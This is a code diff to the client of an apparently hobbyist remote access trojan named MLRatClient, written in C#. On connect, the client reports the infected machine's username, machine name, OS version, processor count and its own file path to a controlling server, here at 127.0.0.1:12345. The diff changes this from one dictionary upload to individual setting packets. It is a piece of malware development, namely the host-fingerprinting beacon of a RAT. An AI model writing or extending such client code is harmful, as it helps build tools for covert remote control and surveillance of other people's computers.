@@ -46,6 +46,7 @@ namespace MLRatClient
             networkClient.OnDisconnect += networkClient_OnDisconnect;
             networkClient.OnConnect += NetworkClient_OnConnect;
             networkClient.ConnectAsync("127.0.0.1", 12345);
+            
         }
 
         private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
@@ -238,6 +239,7 @@ namespace MLRatClient
 
                     if(command == NetworkPacket.PluginsVerified)
                     {
+                        /*
                         Dictionary<string, object> Settings = new Dictionary<string, object>()
                         {
                             {"Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName)},
@@ -247,6 +249,12 @@ namespace MLRatClient
                         };
                         networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSettingsDictionary, Settings);
                         networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
+                        */
+                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName));
+                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "OS", Environment.OSVersion.ToString());
+                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Cores", Environment.ProcessorCount.ToString());
+                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Path", Assembly.GetExecutingAssembly().Location);
+                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
                     }
 
 
@@ -271,12 +279,11 @@ namespace MLRatClient
                     {
                         DisplayException(LoadedPlugins[ID], ex);
                     }
-
                 }
             }
             catch(Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                DisplayException(null, ex);
             }
         }
 
